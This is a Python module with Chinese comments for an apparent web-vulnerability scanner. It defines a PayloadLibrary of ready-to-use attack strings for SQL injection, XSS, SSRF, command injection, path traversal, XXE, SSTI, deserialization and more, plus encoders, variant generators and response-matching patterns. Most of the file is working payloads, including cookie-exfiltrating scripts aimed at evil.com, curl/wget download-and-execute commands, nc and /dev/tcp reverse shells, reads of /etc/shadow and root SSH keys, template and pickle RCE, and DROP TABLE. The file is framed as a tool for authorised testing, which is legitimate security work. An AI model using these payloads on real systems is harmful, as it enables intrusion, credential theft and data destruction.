"""
payload_library安全工具集成模块，提供相关安全工具的封装和调用。

模块功能：
    - 提供相关安全测试功能
    - 支持API调用和命令行使用
    - 与其他模块集成协作

注意事项：
    - 本模块仅用于授权的安全测试
    - 请勿用于非法用途
    - 使用前请确保已获得相关授权
"""
import re
import urllib.parse
from typing import Any, Dict, List, Optional, Tuple

from utils.logger import log


class PayloadLibrary:
    """Payload攻击库 - 结构化的攻击payload管理系统"""

    def __init__(self):
        """初始化PayloadLibrary实例。

        Args:
            self: 类实例。
        """
        self._payloads: Dict[str, List[Dict]] = {}
        self._load_all_payloads()

    def _load_all_payloads(self):
        """加载所有类型的payload"""
        self._payloads = {
            "sql_injection": self._sql_injection_payloads(),
            "xss": self._xss_payloads(),
            "ssrf": self._ssrf_payloads(),
            "command_injection": self._command_injection_payloads(),
            "path_traversal": self._path_traversal_payloads(),
            "xxe": self._xxe_payloads(),
            "open_redirect": self._open_redirect_payloads(),
            "csrf": self._csrf_payloads(),
            "ldap_injection": self._ldap_injection_payloads(),
            "xpath_injection": self._xpath_injection_payloads(),
            "template_injection": self._template_injection_payloads(),
            "insecure_deserialization": self._insecure_deserialization_payloads(),
        }
        total = sum(len(v) for v in self._payloads.values())
        log.info(f"✅ Payload库加载完成: {len(self._payloads)}种类型, 共{total}个payload")

    # ========== SQL注入Payload ==========
    def _sql_injection_payloads(self) -> List[Dict]:
        """加载相关数据。

        Returns:
            操作结果。
        """
        return [
            {"id": "sqli_001", "payload": "'", "type": "error_based", "description": "单引号触发错误", "severity": "high"},
            {"id": "sqli_002", "payload": "\"", "type": "error_based", "description": "双引号触发错误", "severity": "high"},
            {"id": "sqli_003", "payload": "' OR '1'='1", "type": "boolean_based", "description": "布尔真条件", "severity": "critical"},
            {"id": "sqli_004", "payload": "' OR '1'='1' --", "type": "boolean_based", "description": "布尔真条件+注释", "severity": "critical"},
            {"id": "sqli_005", "payload": "' AND '1'='2", "type": "boolean_based", "description": "布尔假条件", "severity": "high"},
            {"id": "sqli_006", "payload": "1' ORDER BY 1--", "type": "union_based", "description": "ORDER BY探测列数", "severity": "high"},
            {"id": "sqli_007", "payload": "1' ORDER BY 10--", "type": "union_based", "description": "ORDER BY探测列数(大值)", "severity": "high"},
            {"id": "sqli_008", "payload": "1' UNION SELECT NULL--", "type": "union_based", "description": "UNION注入基础", "severity": "critical"},
            {"id": "sqli_009", "payload": "1' UNION SELECT NULL,NULL--", "type": "union_based", "description": "UNION注入2列", "severity": "critical"},
            {"id": "sqli_010", "payload": "1' UNION SELECT NULL,NULL,NULL--", "type": "union_based", "description": "UNION注入3列", "severity": "critical"},
            {"id": "sqli_011", "payload": "1 AND SLEEP(5)--", "type": "time_based", "description": "MySQL时间延迟", "severity": "critical"},
            {"id": "sqli_012", "payload": "1' AND SLEEP(5)--", "type": "time_based", "description": "MySQL时间延迟(单引号)", "severity": "critical"},
            {"id": "sqli_013", "payload": "1; WAITFOR DELAY '0:0:5'--", "type": "time_based", "description": "MSSQL时间延迟", "severity": "critical"},
            {"id": "sqli_014", "payload": "1 AND pg_sleep(5)--", "type": "time_based", "description": "PostgreSQL时间延迟", "severity": "critical"},
            {"id": "sqli_015", "payload": "' AND DBMS_LOCK.SLEEP(5)--", "type": "time_based", "description": "Oracle时间延迟", "severity": "critical"},
            {"id": "sqli_016", "payload": "' UNION SELECT @@version--", "type": "union_based", "description": "MySQL版本查询", "severity": "high"},
            {"id": "sqli_017", "payload": "' UNION SELECT version()--", "type": "union_based", "description": "PostgreSQL版本查询", "severity": "high"},
            {"id": "sqli_018", "payload": "' UNION SELECT user()--", "type": "union_based", "description": "MySQL当前用户", "severity": "high"},
            {"id": "sqli_019", "payload": "' UNION SELECT database()--", "type": "union_based", "description": "MySQL当前数据库", "severity": "high"},
            {"id": "sqli_020", "payload": "' UNION SELECT table_name FROM information_schema.tables--", "type": "union_based", "description": "MySQL表名枚举", "severity": "critical"},
            {"id": "sqli_021", "payload": "admin'--", "type": "authentication_bypass", "description": "认证绕过(用户名)", "severity": "critical"},
            {"id": "sqli_022", "payload": "admin' #", "type": "authentication_bypass", "description": "认证绕过(注释)", "severity": "critical"},
            {"id": "sqli_023", "payload": "' OR 1=1#", "type": "authentication_bypass", "description": "认证绕过(万能密码)", "severity": "critical"},
            {"id": "sqli_024", "payload": "1; DROP TABLE users--", "type": "stacked_queries", "description": "堆叠查询(DROP TABLE)", "severity": "critical"},
            {"id": "sqli_025", "payload": "1; INSERT INTO users VALUES ('hacker','pass')--", "type": "stacked_queries", "description": "堆叠查询(INSERT)", "severity": "critical"},
        ]

    # ========== XSS Payload ==========
    def _xss_payloads(self) -> List[Dict]:
        """加载相关数据。

        Returns:
            操作结果。
        """
        return [
            {"id": "xss_001", "payload": "<script>alert(1)</script>", "type": "reflected", "description": "基础script标签", "severity": "high"},
            {"id": "xss_002", "payload": "<script>alert(document.cookie)</script>", "type": "reflected", "description": "窃取Cookie", "severity": "critical"},
            {"id": "xss_003", "payload": "<img src=x onerror=alert(1)>", "type": "reflected", "description": "img标签onerror", "severity": "high"},
            {"id": "xss_004", "payload": "<svg onload=alert(1)>", "type": "reflected", "description": "svg标签onload", "severity": "high"},
            {"id": "xss_005", "payload": "<body onload=alert(1)>", "type": "reflected", "description": "body标签onload", "severity": "high"},
            {"id": "xss_006", "payload": "javascript:alert(1)", "type": "reflected", "description": "javascript伪协议", "severity": "high"},
            {"id": "xss_007", "payload": "<a href=javascript:alert(1)>click</a>", "type": "reflected", "description": "a标签javascript", "severity": "high"},
            {"id": "xss_008", "payload": "<iframe src=javascript:alert(1)>", "type": "reflected", "description": "iframe注入", "severity": "high"},
            {"id": "xss_009", "payload": "\"><script>alert(1)</script>", "type": "attribute_breakout", "description": "属性逃逸(双引号)", "severity": "high"},
            {"id": "xss_010", "payload": "'><script>alert(1)</script>", "type": "attribute_breakout", "description": "属性逃逸(单引号)", "severity": "high"},
            {"id": "xss_011", "payload": "<script>alert(String.fromCharCode(88,83,83))</script>", "type": "encoding_bypass", "description": "CharCode编码绕过", "severity": "medium"},
            {"id": "xss_012", "payload": "<scr<script>ipt>alert(1)</scr</script>ipt>", "type": "filter_bypass", "description": "嵌套标签绕过过滤", "severity": "medium"},
            {"id": "xss_013", "payload": "<IMG SRC=javascript:alert(&quot;XSS&quot;)>", "type": "encoding_bypass", "description": "HTML实体编码", "severity": "medium"},
            {"id": "xss_014", "payload": "<script>alert(document.domain)</script>", "type": "reflected", "description": "获取域名", "severity": "high"},
            {"id": "xss_015", "payload": "<script>fetch('http://evil.com/steal?c='+document.cookie)</script>", "type": "stored", "description": "远程窃取Cookie", "severity": "critical"},
            {"id": "xss_016", "payload": "<script>document.location='http://evil.com'</script>", "type": "reflected", "description": "页面重定向", "severity": "high"},
            {"id": "xss_017", "payload": "<script>document.body.innerHTML='<h1>Hacked</h1>'</script>", "type": "stored", "description": "页面篡改", "severity": "high"},
            {"id": "xss_018", "payload": "<script>new Image().src='http://evil.com/log?c='+document.cookie</script>", "type": "stored", "description": "图片标签外带数据", "severity": "critical"},
            {"id": "xss_019", "payload": "onerror=alert(1)", "type": "event_handler", "description": "事件处理器注入", "severity": "medium"},
            {"id": "xss_020", "payload": "<details open ontoggle=alert(1)>", "type": "dom_based", "description": "details标签ontoggle", "severity": "medium"},
        ]

    # ========== SSRF Payload ==========
    def _ssrf_payloads(self) -> List[Dict]:
        """加载相关数据。

        Returns:
            操作结果。
        """
        return [
            {"id": "ssrf_001", "payload": "http://127.0.0.1/", "type": "internal", "description": "本地回环地址", "severity": "high"},
            {"id": "ssrf_002", "payload": "http://localhost/", "type": "internal", "description": "localhost", "severity": "high"},
            {"id": "ssrf_003", "payload": "http://0.0.0.0/", "type": "internal", "description": "0.0.0.0", "severity": "medium"},
            {"id": "ssrf_004", "payload": "http://[::1]/", "type": "internal", "description": "IPv6回环", "severity": "medium"},
            {"id": "ssrf_005", "payload": "http://169.254.169.254/", "type": "cloud_metadata", "description": "AWS云元数据", "severity": "critical"},
            {"id": "ssrf_006", "payload": "http://169.254.169.254/latest/meta-data/", "type": "cloud_metadata", "description": "AWS元数据路径", "severity": "critical"},
            {"id": "ssrf_007", "payload": "http://metadata.google.internal/", "type": "cloud_metadata", "description": "GCP元数据", "severity": "critical"},
            {"id": "ssrf_008", "payload": "http://10.0.0.1/", "type": "internal_network", "description": "内网A段", "severity": "high"},
            {"id": "ssrf_009", "payload": "http://172.16.0.1/", "type": "internal_network", "description": "内网B段", "severity": "high"},
            {"id": "ssrf_010", "payload": "http://192.168.1.1/", "type": "internal_network", "description": "内网C段", "severity": "high"},
            {"id": "ssrf_011", "payload": "file:///etc/passwd", "type": "file_protocol", "description": "file协议读文件", "severity": "critical"},
            {"id": "ssrf_012", "payload": "file:///etc/hosts", "type": "file_protocol", "description": "file协议读hosts", "severity": "high"},
            {"id": "ssrf_013", "payload": "gopher://127.0.0.1:6379/_INFO", "type": "gopher_protocol", "description": "gopher协议攻击Redis", "severity": "critical"},
            {"id": "ssrf_014", "payload": "dict://127.0.0.1:6379/INFO", "type": "dict_protocol", "description": "dict协议", "severity": "high"},
            {"id": "ssrf_015", "payload": "http://127.0.0.1:22/", "type": "port_scan", "description": "探测SSH端口", "severity": "medium"},
            {"id": "ssrf_016", "payload": "http://127.0.0.1:3306/", "type": "port_scan", "description": "探测MySQL端口", "severity": "medium"},
            {"id": "ssrf_017", "payload": "http://127.0.0.1:6379/", "type": "port_scan", "description": "探测Redis端口", "severity": "medium"},
            {"id": "ssrf_018", "payload": "http://127.0.0.1:8080/", "type": "port_scan", "description": "探测HTTP代理端口", "severity": "medium"},
            {"id": "ssrf_019", "payload": "http://127.0.0.1.nip.io/", "type": "dns_bypass", "description": "DNS重绑定绕过", "severity": "medium"},
            {"id": "ssrf_020", "payload": "http://2130706433/", "type": "encoding_bypass", "description": "IP十进制编码绕过", "severity": "medium"},
        ]

    # ========== 命令注入Payload ==========
    def _command_injection_payloads(self) -> List[Dict]:
        """加载相关数据。

        Returns:
            操作结果。
        """
        return [
            {"id": "cmdi_001", "payload": "; id", "type": "command_separator", "description": "分号分隔符", "severity": "critical"},
            {"id": "cmdi_002", "payload": "&& id", "type": "logical_and", "description": "逻辑与", "severity": "critical"},
            {"id": "cmdi_003", "payload": "|| id", "type": "logical_or", "description": "逻辑或", "severity": "critical"},
            {"id": "cmdi_004", "payload": "| id", "type": "pipe", "description": "管道符", "severity": "critical"},
            {"id": "cmdi_005", "payload": "`id`", "type": "backtick", "description": "反引号命令替换", "severity": "critical"},
            {"id": "cmdi_006", "payload": "$(id)", "type": "command_substitution", "description": "$()命令替换", "severity": "critical"},
            {"id": "cmdi_007", "payload": "\nid", "type": "newline", "description": "换行符注入", "severity": "critical"},
            {"id": "cmdi_008", "payload": "; whoami", "type": "command_separator", "description": "获取当前用户", "severity": "critical"},
            {"id": "cmdi_009", "payload": "; uname -a", "type": "command_separator", "description": "获取系统信息", "severity": "high"},
            {"id": "cmdi_010", "payload": "; cat /etc/passwd", "type": "command_separator", "description": "读取passwd文件", "severity": "critical"},
            {"id": "cmdi_011", "payload": "; ls -la", "type": "command_separator", "description": "列出目录", "severity": "high"},
            {"id": "cmdi_012", "payload": "; pwd", "type": "command_separator", "description": "当前目录", "severity": "medium"},
            {"id": "cmdi_013", "payload": "; sleep 5", "type": "time_based", "description": "时间延迟检测", "severity": "high"},
            {"id": "cmdi_014", "payload": "| sleep 5", "type": "time_based", "description": "管道时间延迟", "severity": "high"},
            {"id": "cmdi_015", "payload": "$(sleep 5)", "type": "time_based", "description": "命令替换时间延迟", "severity": "high"},
            {"id": "cmdi_016", "payload": "; curl http://evil.com/shell.sh | bash", "type": "remote_execution", "description": "远程执行shell", "severity": "critical"},
            {"id": "cmdi_017", "payload": "; wget http://evil.com/shell.sh -O /tmp/s.sh && bash /tmp/s.sh", "type": "remote_execution", "description": "wget下载执行", "severity": "critical"},
            {"id": "cmdi_018", "payload": "; nc -e /bin/bash evil.com 4444", "type": "reverse_shell", "description": "nc反弹shell", "severity": "critical"},
            {"id": "cmdi_019", "payload": "; bash -i >& /dev/tcp/evil.com/4444 0>&1", "type": "reverse_shell", "description": "bash反弹shell", "severity": "critical"},
            {"id": "cmdi_020", "payload": "%0a id", "type": "encoding_bypass", "description": "URL编码换行符", "severity": "high"},
        ]

    # ========== 路径遍历Payload ==========
    def _path_traversal_payloads(self) -> List[Dict]:
        """加载相关数据。

        Returns:
            操作结果。
        """
        return [
            {"id": "pt_001", "payload": "../../../../etc/passwd", "type": "relative", "description": "相对路径遍历", "severity": "critical"},
            {"id": "pt_002", "payload": "../../../../../etc/passwd", "type": "relative", "description": "深层路径遍历", "severity": "critical"},
            {"id": "pt_003", "payload": "....//....//....//etc/passwd", "type": "filter_bypass", "description": "双写绕过过滤", "severity": "high"},
            {"id": "pt_004", "payload": "..%2f..%2f..%2fetc/passwd", "type": "encoding_bypass", "description": "URL编码斜杠", "severity": "high"},
            {"id": "pt_005", "payload": "..%252f..%252f..%252fetc/passwd", "type": "encoding_bypass", "description": "双重URL编码", "severity": "high"},
            {"id": "pt_006", "payload": "/etc/passwd", "type": "absolute", "description": "绝对路径", "severity": "high"},
            {"id": "pt_007", "payload": "file:///etc/passwd", "type": "file_uri", "description": "file URI", "severity": "critical"},
            {"id": "pt_008", "payload": "../../../../windows/win.ini", "type": "windows", "description": "Windows路径遍历", "severity": "high"},
            {"id": "pt_009", "payload": "..\\..\\..\\windows\\win.ini", "type": "windows", "description": "Windows反斜杠", "severity": "high"},
            {"id": "pt_010", "payload": "../../../../etc/hosts", "type": "relative", "description": "读取hosts文件", "severity": "high"},
            {"id": "pt_011", "payload": "../../../../proc/self/environ", "type": "linux", "description": "读取进程环境变量", "severity": "critical"},
            {"id": "pt_012", "payload": "../../../../proc/version", "type": "linux", "description": "读取内核版本", "severity": "medium"},
            {"id": "pt_013", "payload": "../../../../var/log/apache2/access.log", "type": "linux", "description": "读取Apache日志", "severity": "high"},
            {"id": "pt_014", "payload": "../../../../var/log/auth.log", "type": "linux", "description": "读取认证日志", "severity": "high"},
            {"id": "pt_015", "payload": "..%c0%af..%c0%af..%c0%afetc/passwd", "type": "encoding_bypass", "description": "UTF-8过度编码", "severity": "medium"},
            {"id": "pt_016", "payload": "....\\\\/....\\\\/....\\\\/etc/passwd", "type": "filter_bypass", "description": "混合斜杠绕过", "severity": "medium"},
            {"id": "pt_017", "payload": "../../../../../../root/.ssh/id_rsa", "type": "sensitive", "description": "读取SSH私钥", "severity": "critical"},
            {"id": "pt_018", "payload": "../../../../../../root/.bash_history", "type": "sensitive", "description": "读取bash历史", "severity": "high"},
            {"id": "pt_019", "payload": "../../../../../../etc/shadow", "type": "sensitive", "description": "读取shadow文件", "severity": "critical"},
            {"id": "pt_020", "payload": "....//....//....//....//windows/system32/drivers/etc/hosts", "type": "windows", "description": "Windows hosts文件", "severity": "high"},
        ]

    # ========== XXE Payload ==========
    def _xxe_payloads(self) -> List[Dict]:
        """加载相关数据。

        Returns:
            操作结果。
        """
        return [
            {"id": "xxe_001", "payload": "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>", "type": "file_read", "description": "基础XXE读文件", "severity": "critical"},
            {"id": "xxe_002", "payload": "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/hosts\">]><foo>&xxe;</foo>", "type": "file_read", "description": "读取hosts文件", "severity": "high"},
            {"id": "xxe_003", "payload": "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://127.0.0.1/\">]><foo>&xxe;</foo>", "type": "ssrf", "description": "XXE触发SSRF", "severity": "high"},
            {"id": "xxe_004", "payload": "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">]><foo>&xxe;</foo>", "type": "cloud_metadata", "description": "XXE读取AWS元数据", "severity": "critical"},
            {"id": "xxe_005", "payload": "<!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://evil.com/evil.dtd\"> %xxe;]><foo>&send;</foo>", "type": "out_of_band", "description": "OOB XXE外带数据", "severity": "critical"},
            {"id": "xxe_006", "payload": "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"expect://id\">]><foo>&xxe;</foo>", "type": "rce", "description": "expect协议RCE", "severity": "critical"},
            {"id": "xxe_007", "payload": "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">]><foo>&xxe;</foo>", "type": "windows", "description": "Windows XXE", "severity": "high"},
            {"id": "xxe_008", "payload": "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=index.php\">]><foo>&xxe;</foo>", "type": "php_filter", "description": "PHP filter读源码", "severity": "critical"},
            {"id": "xxe_009", "payload": "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///proc/self/environ\">]><foo>&xxe;</foo>", "type": "linux", "description": "读取环境变量", "severity": "critical"},
            {"id": "xxe_010", "payload": "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/shadow\">]><foo>&xxe;</foo>", "type": "sensitive", "description": "读取shadow文件", "severity": "critical"},
        ]

    # ========== 开放重定向Payload ==========
    def _open_redirect_payloads(self) -> List[Dict]:
        """加载相关数据。

        Returns:
            操作结果。
        """
        return [
            {"id": "or_001", "payload": "https://evil.com", "type": "direct", "description": "直接外部URL", "severity": "medium"},
            {"id": "or_002", "payload": "//evil.com", "type": "protocol_relative", "description": "协议相对URL", "severity": "medium"},
            {"id": "or_003", "payload": "/\\evil.com", "type": "backslash_bypass", "description": "反斜杠绕过", "severity": "medium"},
            {"id": "or_004", "payload": "/evil.com", "type": "path_bypass", "description": "路径形式绕过", "severity": "low"},
            {"id": "or_005", "payload": "https:evil.com", "type": "missing_slash", "description": "缺少斜杠绕过", "severity": "low"},
            {"id": "or_006", "payload": "https://evil.com\\@trusted.com", "type": "at_bypass", "description": "@符号绕过", "severity": "medium"},
            {"id": "or_007", "payload": "https://trusted.com.evil.com", "type": "subdomain_bypass", "description": "子域名绕过", "severity": "medium"},
            {"id": "or_008", "payload": "https://evil.com#trusted.com", "type": "fragment_bypass", "description": "锚点绕过", "severity": "low"},
            {"id": "or_009", "payload": "javascript:alert(1)", "type": "xss", "description": "javascript协议XSS", "severity": "high"},
            {"id": "or_010", "payload": "data:text/html,<script>alert(1)</script>", "type": "data_uri", "description": "data URI XSS", "severity": "high"},
        ]

    # ========== CSRF Payload ==========
    def _csrf_payloads(self) -> List[Dict]:
        """加载相关数据。

        Returns:
            操作结果。
        """
        return [
            {"id": "csrf_001", "payload": "<form action='http://target.com/change-password' method='POST'><input type='hidden' name='password' value='hacked'><input type='submit'></form>", "type": "form_post", "description": "表单POST CSRF", "severity": "high"},
            {"id": "csrf_002", "payload": "<img src='http://target.com/delete?id=1' width=0 height=0>", "type": "get_request", "description": "GET请求CSRF", "severity": "medium"},
            {"id": "csrf_003", "payload": "<script>fetch('http://target.com/api/user',{method:'DELETE',credentials:'include'})</script>", "type": "fetch_api", "description": "Fetch API CSRF", "severity": "high"},
            {"id": "csrf_004", "payload": "<script>var xhr=new XMLHttpRequest();xhr.open('POST','http://target.com/transfer',true);xhr.withCredentials=true;xhr.send('amount=1000&to=attacker')</script>", "type": "xhr", "description": "XHR CSRF", "severity": "high"},
            {"id": "csrf_005", "payload": "<iframe src='http://target.com/settings' name='csrf-frame'></iframe><form action='http://target.com/settings' method='POST' target='csrf-frame'>...</form>", "type": "iframe", "description": "iframe CSRF", "severity": "medium"},
        ]

    # ========== LDAP注入Payload ==========
    def _ldap_injection_payloads(self) -> List[Dict]:
        """加载相关数据。

        Returns:
            操作结果。
        """
        return [
            {"id": "ldap_001", "payload": "*", "type": "wildcard", "description": "通配符匹配所有", "severity": "high"},
            {"id": "ldap_002", "payload": "*)(uid=*))(|(uid=*", "type": "boolean_bypass", "description": "布尔条件绕过", "severity": "critical"},
            {"id": "ldap_003", "payload": "admin)(&)", "type": "authentication_bypass", "description": "认证绕过", "severity": "critical"},
            {"id": "ldap_004", "payload": "*)(|(password=*", "type": "information_disclosure", "description": "信息泄露", "severity": "high"},
            {"id": "ldap_005", "payload": ")(!(!(objectClass=*", "type": "boolean_bypass", "description": "NOT条件绕过", "severity": "high"},
        ]

    # ========== XPath注入Payload ==========
    def _xpath_injection_payloads(self) -> List[Dict]:
        """加载相关数据。

        Returns:
            操作结果。
        """
        return [
            {"id": "xpath_001", "payload": "' or '1'='1", "type": "boolean_bypass", "description": "布尔真条件", "severity": "critical"},
            {"id": "xpath_002", "payload": "' or '1'='1' or '1'='1", "type": "boolean_bypass", "description": "多重布尔条件", "severity": "critical"},
            {"id": "xpath_003", "payload": "admin' or '1'='1", "type": "authentication_bypass", "description": "认证绕过", "severity": "critical"},
            {"id": "xpath_004", "payload": "' or count(/*)=1 or '1'='1", "type": "error_based", "description": "计数探测", "severity": "high"},
            {"id": "xpath_005", "payload": "' or substring(name(/*[1]),1,1)='a' or '1'='1", "type": "blind", "description": "盲注提取", "severity": "high"},
        ]

    # ========== 模板注入Payload ==========
    def _template_injection_payloads(self) -> List[Dict]:
        """加载相关数据。

        Returns:
            操作结果。
        """
        return [
            {"id": "ssti_001", "payload": "{{7*7}}", "type": "detection", "description": "基础数学运算检测", "severity": "high"},
            {"id": "ssti_002", "payload": "{{config}}", "type": "information_disclosure", "description": "Flask配置泄露", "severity": "high"},
            {"id": "ssti_003", "payload": "{{''.__class__.__mro__[1].__subclasses__()}}", "type": "rce", "description": "Python对象继承RCE", "severity": "critical"},
            {"id": "ssti_004", "payload": "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}", "type": "rce", "description": "Flask RCE", "severity": "critical"},
            {"id": "ssti_005", "payload": "${7*7}", "type": "detection", "description": "JSP/EL表达式检测", "severity": "high"},
            {"id": "ssti_006", "payload": "#{7*7}", "type": "detection", "description": "Ruby/JS模板检测", "severity": "medium"},
            {"id": "ssti_007", "payload": "<%= 7*7 %>", "type": "detection", "description": "ERB模板检测", "severity": "medium"},
            {"id": "ssti_008", "payload": "{{ ''.__class__.__mro__[-1].__subclasses__()[40]('/etc/passwd').read() }}", "type": "file_read", "description": "文件读取", "severity": "critical"},
        ]

    # ========== 反序列化Payload ==========
    def _insecure_deserialization_payloads(self) -> List[Dict]:
        """加载相关数据。

        Returns:
            操作结果。
        """
        return [
            {"id": "deser_001", "payload": "rO0ABXNyABdqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAADdAAEbmFtZXQABnZhbHVldAAEa2V5cQB+AAJ4", "type": "java", "description": "Java序列化基础", "severity": "high"},
            {"id": "deser_002", "payload": "gASVHAAAAAAAACMBc3lzdGVtlJOUjABpZJlSlC4=", "type": "python", "description": "Python pickle RCE", "severity": "critical"},
            {"id": "deser_003", "payload": "{\"rce\":\"__import__('os').system('id')\"}", "type": "python_yaml", "description": "YAML反序列化RCE", "severity": "critical"},
            {"id": "deser_004", "payload": "PHP Object Injection", "type": "php", "description": "PHP对象注入", "severity": "high"},
            {"id": "deser_005", "payload": "{\"$type\":\"System.Diagnostics.Process, System\",\"StartInfo\":{\"FileName\":\"cmd.exe\",\"Arguments\":\"/c id\"}}", "type": ".net", "description": ".NET反序列化RCE", "severity": "critical"},
        ]

    # ========== 公共方法 ==========

    def get_payloads(self, vuln_type: str, severity: Optional[str] = None,
                     limit: int = 10) -> List[Dict]:
        """获取指定类型的payload"""
        payloads = self._payloads.get(vuln_type, [])
        if severity:
            payloads = [p for p in payloads if p.get("severity") == severity]
        return payloads[:limit]

    def get_all_types(self) -> List[str]:
        """获取所有漏洞类型"""
        return list(self._payloads.keys())

    def get_stats(self) -> Dict:
        """获取payload库统计"""
        return {
            "total_types": len(self._payloads),
            "total_payloads": sum(len(v) for v in self._payloads.values()),
            "by_type": {k: len(v) for k, v in self._payloads.items()},
        }

    def encode_payload(self, payload: str, encoding: str = "url") -> str:
        """编码payload"""
        if encoding == "url":
            return urllib.parse.quote(payload)
        elif encoding == "double_url":
            return urllib.parse.quote(urllib.parse.quote(payload))
        elif encoding == "base64":
            import base64
            return base64.b64encode(payload.encode()).decode()
        elif encoding == "html":
            import html
            return html.escape(payload)
        else:
            return payload

    def generate_variants(self, payload: str) -> List[str]:
        """生成payload变体（编码/变形）"""
        variants = [payload]
        # URL编码
        variants.append(self.encode_payload(payload, "url"))
        # 双重URL编码
        variants.append(self.encode_payload(payload, "double_url"))
        # Base64编码
        variants.append(self.encode_payload(payload, "base64"))
        # 大小写混合
        if any(c.isalpha() for c in payload):
            mixed = "".join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(payload))
            variants.append(mixed)
        return list(set(variants))

    def match_pattern(self, response: str, vuln_type: str) -> List[Dict]:
        """匹配响应中的漏洞特征"""
        matches = []
        patterns = {
            "sql_injection": [
                (r"SQL syntax.*MySQL", "MySQL语法错误"),
                (r"Warning.*mysql_.*", "MySQL函数警告"),
                (r"valid MySQL result", "MySQL有效结果"),
                (r"PostgreSQL.*ERROR", "PostgreSQL错误"),
                (r"Warning.*\Wpg_\.*", "PostgreSQL函数警告"),
                (r"Microsoft SQL Native Client error", "MSSQL错误"),
                (r"ODBC SQL Server Driver", "MSSQL ODBC错误"),
                (r"ORA-\d{5}", "Oracle错误"),
                (r"SQLite/JDBCDriver", "SQLite错误"),
                (r"System\.Data\.SQLite\.SQLiteException", "SQLite异常"),
            ],
            "xss": [
                (r"<script[^>]*>.*?</script>", "Script标签"),
                (r"onerror\s*=", "onerror事件"),
                (r"onload\s*=", "onload事件"),
                (r"javascript:", "javascript伪协议"),
                (r"alert\(", "alert函数"),
                (r"document\.cookie", "Cookie访问"),
            ],
            "command_injection": [
                (r"root:x:0:0", "/etc/passwd内容"),
                (r"uid=\d+\(.*\) gid=", "id命令输出"),
                (r"Linux.*\d+\.\d+\.\d+", "uname输出"),
                (r"\[boot loader\]", "Windows win.ini"),
            ],
            "path_traversal": [
                (r"root:x:0:0:root", "/etc/passwd"),
                (r"127\.0\.0\.1\s+localhost", "/etc/hosts"),
                (r"\[fonts\]", "Windows win.ini"),
                (r"root:.*:0:0:", "shadow文件"),
            ],
        }

        vuln_patterns = patterns.get(vuln_type, [])
        for pattern, description in vuln_patterns:
            if re.search(pattern, response, re.IGNORECASE):
                matches.append({"pattern": pattern, "description": description})

        return matches


# 全局单例
payload_library = PayloadLibrary()
